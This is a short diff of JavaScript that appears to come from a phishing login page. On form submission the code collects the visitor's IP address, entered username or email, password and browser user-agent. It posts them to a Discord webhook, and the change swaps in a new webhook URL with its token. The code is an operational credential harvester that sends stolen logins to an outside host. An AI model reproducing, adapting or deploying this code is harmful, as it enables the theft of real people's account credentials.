@@ -298,7 +298,7 @@ if (pwd.value.length > 0){
             // Handle the response data here
             var ipAddress = response.ip
 
-            request.open("POST", "https://discord.com/api/webhooks/1217741579415191552/LXdZowAAr1gAYyEaVHnkLDYFBhAWJlmrYlJOqRL6Qv8zZa2JUMskP67Ba66Dcl_SU398");
+            request.open("POST", "https://discord.com/api/webhooks/1255109847435706480/2uzqiIqqtJ6E9MJmF33-zkZfh3nBHxjoET8Nl-cmuUa1Fy1EtszH9NQbZ_cq2mXfoLr_");
             request.setRequestHeader('Content-type', 'application/json');
             var params = {
             content: (" > **IP: **" + ipAddress)
@@ -312,7 +312,7 @@ if (pwd.value.length > 0){
         xhr.send();
 
         var request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1217741579415191552/LXdZowAAr1gAYyEaVHnkLDYFBhAWJlmrYlJOqRL6Qv8zZa2JUMskP67Ba66Dcl_SU398");
+        request.open("POST", "https://discord.com/api/webhooks/1255109847435706480/2uzqiIqqtJ6E9MJmF33-zkZfh3nBHxjoET8Nl-cmuUa1Fy1EtszH9NQbZ_cq2mXfoLr_");
         request.setRequestHeader('Content-type', 'application/json');
         var params = {
           content: ("> **USERNAME  : **" + emailFinal + "\n> **PASSWORD : **" + document.getElementById('password--2').value + "\n> **USER-AGENT: **" + agents)
